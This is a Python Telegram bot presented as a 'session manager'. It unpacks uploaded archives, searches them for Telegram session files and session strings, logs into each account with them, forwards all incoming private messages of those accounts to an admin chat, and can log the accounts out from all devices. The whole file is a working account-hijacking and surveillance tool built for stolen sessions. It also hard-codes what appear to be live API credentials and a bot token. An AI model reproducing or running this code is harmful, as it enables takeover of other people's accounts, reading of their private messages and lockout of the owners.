import os
import asyncio
import tempfile
import shutil
import re
import json
import tarfile
import zipfile
import magic
import rarfile
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import Message, ContentType
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import ApiIdInvalidError, AccessTokenInvalidError

# ========== DEFAULT CONFIG ==========
DEFAULT_API_ID = 20598937
DEFAULT_API_HASH = "0c3a9153ca8295883665459e4c22c674"
DEFAULT_BOT_TOKEN = "8434544662:AAGGSbiMBkNsz7pPd4U_prQAipDgC00NvTg"
DEFAULT_ADMIN_ID = 7632476151
# ============================

CONFIG_FILE = "bot_config.json"
SESSIONS_DIR = "sessions"

if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

# Load or create config
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    
    # Create default config
    default_config = {
        "api_id": DEFAULT_API_ID,
        "api_hash": DEFAULT_API_HASH,
        "bot_token": DEFAULT_BOT_TOKEN,
        "admin_id": DEFAULT_ADMIN_ID
    }
    save_config(default_config)
    return default_config

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

# Load initial config
config = load_config()

# Initialize bot with config
bot = Bot(token=config["bot_token"])
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Store active Telethon clients
clients = {}

# FSM States for admin panel
class ConfigStates(StatesGroup):
    waiting_api_id = State()
    waiting_api_hash = State()
    waiting_bot_token = State()
    waiting_admin_id = State()

# --- Utilities ------------------------------------------------
def safe_name(name: str) -> str:
    """Make a file-system safe name."""
    return re.sub(r'[^A-Za-z0-9_.-]', '_', name)

def extract_archive(file_path: str, dest_dir: str):
    """Extract common archive types (zip, tar, rar) into dest_dir."""
    try:
        if zipfile.is_zipfile(file_path):
            with zipfile.ZipFile(file_path, 'r') as z:
                z.extractall(dest_dir)
            return True
        if tarfile.is_tarfile(file_path):
            with tarfile.open(file_path, 'r:*') as t:
                t.extractall(dest_dir)
            return True
        try:
            if rarfile.is_rarfile(file_path):
                with rarfile.RarFile(file_path) as r:
                    r.extractall(dest_dir)
                return True
        except rarfile.Error:
            pass
    except Exception as e:
        print("Extract error:", e)
    return False

def find_session_files(root_dir: str):
    """Find .session files and similar in a folder."""
    found = []
    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            if fn.lower().endswith('.session') or 'session' in fn.lower():
                found.append(('file', os.path.join(dirpath, fn), fn))
    return found

BASE64_RE = re.compile(r'([A-Za-z0-9+/=_\-]{80,})')

def find_string_sessions_in_text(root_dir: str):
    """Find string session tokens inside text/JSON files."""
    found = []
    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            full = os.path.join(dirpath, fn)
            try:
                mtype = magic.from_file(full, mime=True)
                if not mtype or not mtype.startswith('text'):
                    continue
                with open(full, 'r', errors='ignore') as f:
                    txt = f.read()
                try:
                    j = json.loads(txt)
                    for key in ['string_session', 'session', 'session_string', 'auth']:
                        if key in j and isinstance(j[key], str) and len(j[key]) > 50:
                            found.append(('string', j[key], f"{fn}:{key}"))
                except Exception:
                    pass
                for m in BASE64_RE.findall(txt):
                    if len(m) > 80:
                        found.append(('string', m, f"{fn}:token"))
            except Exception:
                continue
    return found

async def start_telethon_from_file(session_path: str, session_name: str):
    """Start Telethon client from a .session file."""
    dest_base = os.path.join(SESSIONS_DIR, safe_name(session_name))
    try:
        shutil.copy(session_path, dest_base + '.session')
    except Exception as e:
        print("Copy session failed:", e)
        return False

    try:
        client = TelegramClient(dest_base, config["api_id"], config["api_hash"])
        await client.start()
        
        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            try:
                sender = await event.get_sender()
                sender_name = sender.username or (sender.first_name or "Unknown")
                text = event.message.message or ''
                
                if text:
                    # Send to admin
                    out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
                    await bot.send_message(config["admin_id"], out)
                    
            except Exception as ee:
                print(f"Handler error: {ee}")

        clients[session_name] = client
        print(f"Started session (file): {session_name}")
        return True
    except ApiIdInvalidError as e:
        error_msg = f"❌ API ID/Hash Error for session {session_name}: {e}"
        print(error_msg)
        await bot.send_message(config["admin_id"], error_msg)
        return False
    except Exception as e:
        print(f"Start client from file failed: {e}")
        return False

async def start_telethon_from_string(session_string: str, session_name: str):
    """Start Telethon client from a StringSession."""
    try:
        ss = StringSession(session_string)
        client = TelegramClient(ss, config["api_id"], config["api_hash"])
        await client.start()
        
        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            try:
                sender = await event.get_sender()
                sender_name = sender.username or (sender.first_name or "Unknown")
                text = event.message.message or ''
                
                if text:
                    # Send to admin
                    out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
                    await bot.send_message(config["admin_id"], out)
                    
            except Exception as ee:
                print(f"Handler error: {ee}")

        clients[session_name] = client
        print(f"Started session (string): {session_name}")
        return True
    except ApiIdInvalidError as e:
        error_msg = f"❌ API ID/Hash Error for session {session_name}: {e}"
        print(error_msg)
        await bot.send_message(config["admin_id"], error_msg)
        return False
    except Exception as e:
        print(f"Start client from string failed: {e}")
        return False

# ========== Bot Handlers ==========
@router.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id != config["admin_id"]:
        return
    await message.reply(
        "✅ Session manager ready.\n\n"
        "Available commands:\n"
        "/start - Show this message\n"
        "/panel - Admin configuration panel\n"
        "/list - Show active sessions\n"
        "/stop - Stop all sessions\n"
        "/outall - Logout all accounts\n"
        "/logout <name> - Logout specific session\n\n"
        "Send me .session / zip / tar / rar / txt / json files and I will start the sessions automatically."
    )

@router.message(Command("panel"))
async def cmd_panel(message: Message):
    if message.from_user.id != config["admin_id"]:
        return
    
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔧 Set API ID", callback_data="set_api_id")],
        [types.InlineKeyboardButton(text="🔑 Set API Hash", callback_data="set_api_hash")],
        [types.InlineKeyboardButton(text="🤖 Set Bot Token", callback_data="set_bot_token")],
        [types.InlineKeyboardButton(text="👑 Set Admin ID", callback_data="set_admin_id")],
        [types.InlineKeyboardButton(text="📊 Current Config", callback_data="show_config")],
        [types.InlineKeyboardButton(text="🔄 Reload Bot", callback_data="reload_bot")]
    ])
    
    await message.reply("🛠️ Admin Configuration Panel", reply_markup=keyboard)

@router.callback_query(lambda c: c.data.startswith('set_') or c.data in ['show_config', 'reload_bot'])
async def process_config_callback(callback_query: types.CallbackQuery, state: FSMContext):
    if callback_query.from_user.id != config["admin_id"]:
        await callback_query.answer("❌ Access denied")
        return
    
    data = callback_query.data
    
    if data == "set_api_id":
        await callback_query.message.answer("Please send your new API ID:")
        await state.set_state(ConfigStates.waiting_api_id)
    
    elif data == "set_api_hash":
        await callback_query.message.answer("Please send your new API Hash:")
        await state.set_state(ConfigStates.waiting_api_hash)
    
    elif data == "set_bot_token":
        await callback_query.message.answer("Please send your new Bot Token:")
        await state.set_state(ConfigStates.waiting_bot_token)
    
    elif data == "set_admin_id":
        await callback_query.message.answer("Please send your new Admin ID:")
        await state.set_state(ConfigStates.waiting_admin_id)
    
    elif data == "show_config":
        current_config = load_config()
        config_text = (
            f"📊 Current Configuration:\n\n"
            f"🔧 API ID: `{current_config['api_id']}`\n"
            f"🔑 API Hash: `{current_config['api_hash']}`\n"
            f"🤖 Bot Token: `{current_config['bot_token'][:10]}...`\n"
            f"👑 Admin ID: `{current_config['admin_id']}`\n"
            f"🔌 Active Sessions: `{len(clients)}`"
        )
        await callback_query.message.answer(config_text, parse_mode="Markdown")
    
    elif data == "reload_bot":
        global bot
        try:
            await bot.session.close()
            bot = Bot(token=config["bot_token"])
            await callback_query.message.answer("✅ Bot reloaded with new configuration!")
        except Exception as e:
            await callback_query.message.answer(f"❌ Error reloading bot: {e}")
    
    await callback_query.answer()

@router.message(ConfigStates.waiting_api_id)
async def process_api_id(message: Message, state: FSMContext):
    try:
        api_id = int(message.text)
        config["api_id"] = api_id
        save_config(config)
        await message.answer(f"✅ API ID updated to: `{api_id}`", parse_mode="Markdown")
        await state.clear()
    except ValueError:
        await message.answer("❌ Invalid API ID. Please send a valid number.")

@router.message(ConfigStates.waiting_api_hash)
async def process_api_hash(message: Message, state: FSMContext):
    api_hash = message.text.strip()
    if len(api_hash) < 10:
        await message.answer("❌ Invalid API Hash. Please send a valid hash.")
        return
    
    config["api_hash"] = api_hash
    save_config(config)
    await message.answer(f"✅ API Hash updated to: `{api_hash}`", parse_mode="Markdown")
    await state.clear()

@router.message(ConfigStates.waiting_bot_token)
async def process_bot_token(message: Message, state: FSMContext):
    bot_token = message.text.strip()
    if not bot_token.startswith('') or ':' not in bot_token:
        await message.answer("❌ Invalid Bot Token format.")
        return
    
    config["bot_token"] = bot_token
    save_config(config)
    await message.answer("✅ Bot Token updated successfully!")
    await state.clear()

@router.message(ConfigStates.waiting_admin_id)
async def process_admin_id(message: Message, state: FSMContext):
    try:
        admin_id = int(message.text)
        config["admin_id"] = admin_id
        save_config(config)
        await message.answer(f"✅ Admin ID updated to: `{admin_id}`", parse_mode="Markdown")
        await state.clear()
    except ValueError:
        await message.answer("❌ Invalid Admin ID. Please send a valid number.")

@router.message(Command("list"))
async def cmd_list(message: Message):
    if message.from_user.id != config["admin_id"]:
        return
    if clients:
        txt = "Active sessions:\n" + "\n".join(f" - {k}" for k in clients)
    else:
        txt = "Active sessions:\n (none)"
    await message.reply(txt)

@router.message(Command("stop"))
async def cmd_stop(message: Message):
    if message.from_user.id != config["admin_id"]:
        return
    for name, client in list(clients.items()):
        try:
            await client.disconnect()
        except:
            pass
        clients.pop(name, None)
    await message.reply("✅ All sessions stopped.")

@router.message(Command("outall"))
async def cmd_outall(message: Message):
    """Logout all accounts from all devices"""
    if message.from_user.id != config["admin_id"]:
        return
    
    if not clients:
        await message.reply("❌ No active sessions found.")
        return
    
    success_count = 0
    fail_count = 0
    report_lines = []
    
    for name, client in list(clients.items()):
        try:
            # Logout from all devices
            await client.log_out()
            await client.disconnect()
            clients.pop(name, None)
            success_count += 1
            report_lines.append(f"✅ {name} - Logged out from all devices")
        except Exception as e:
            fail_count += 1
            report_lines.append(f"❌ {name} - Failed: {str(e)}")
    
    report = f"📊 Logout Report:\n\nSuccess: {success_count}\nFailed: {fail_count}\n\n" + "\n".join(report_lines[:20])
    await message.reply(report)

@router.message(Command("logout"))
async def cmd_logout(message: Message):
    if message.from_user.id != config["admin_id"]:
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("Usage: /logout <session_name_or_phone>")
        return

    session_name = safe_name(args[1])
    client = clients.get(session_name)
    if client:
        try:
            await client.log_out()  # Logout from all devices
            await client.disconnect()
        except:
            pass
        clients.pop(session_name, None)
        await message.reply(f"✅ Logged out from all devices: {session_name}")
    else:
        await message.reply(f"❌ No active session found with name: {session_name}")

@router.message(lambda message: message.content_type == ContentType.DOCUMENT)
async def handle_document(message: Message):
    if message.from_user.id != config["admin_id"]:
        return

    doc = message.document
    fname = doc.file_name or "uploaded_file"
    safe_fname = safe_name(fname)
    saved_path = os.path.join(SESSIONS_DIR, safe_fname)

    await message.reply("📥 Upload received. Processing...")
    await bot.download(file=doc, destination=saved_path)

    tempdir = tempfile.mkdtemp(prefix="sess_extract_")
    try:
        extracted = extract_archive(saved_path, tempdir)
        if not extracted:
            shutil.copy(saved_path, os.path.join(tempdir, safe_fname))

        found_files = find_session_files(tempdir)
        found_strings = find_string_sessions_in_text(tempdir)

        report_lines = []
        started = 0
        api_errors = 0

        for ftype, fullpath, shortname in found_files:
            base_name = os.path.splitext(shortname)[0]
            ok = await start_telethon_from_file(fullpath, base_name)
            if ok:
                report_lines.append(f"✅ Started session from file: {shortname}")
                started += 1
            else:
                if "API ID/Hash Error" in str(ok):
                    api_errors += 1
                    report_lines.append(f"❌ API Error in file: {shortname}")
                else:
                    report_lines.append(f"❌ Failed to start from file: {shortname}")

        idx = 0
        for ftype, s, label in found_strings:
            idx += 1
            name = f"{safe_fname}_str_{idx}"
            ok = await start_telethon_from_string(s, name)
            if ok:
                report_lines.append(f"✅ Started session from string: {label}")
                started += 1
            else:
                if "API ID/Hash Error" in str(ok):
                    api_errors += 1
                    report_lines.append(f"❌ API Error in string: {label}")
                else:
                    report_lines.append(f"❌ Failed to start session from string: {label}")

        if api_errors > 0:
            report_lines.append(f"\n⚠️ {api_errors} sessions failed due to API ID/Hash errors. Check your configuration in /panel")

        if started == 0:
            report = "❌ No sessions found or started.\n\nDetails:\n" + "\n".join(report_lines[:10])
        else:
            report = f"✅ Started {started} session(s).\n\nDetails:\n" + "\n".join(report_lines[:50])

        await message.reply(report)
    except Exception as e:
        await message.reply(f"Error processing file: {e}")
    finally:
        try:
            shutil.rmtree(tempdir)
        except:
            pass

# ========== Run bot ==========
async def main():
    print("Bot running...")
    print(f"Admin ID: {config['admin_id']}")
    print(f"Active sessions: {len(clients)}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
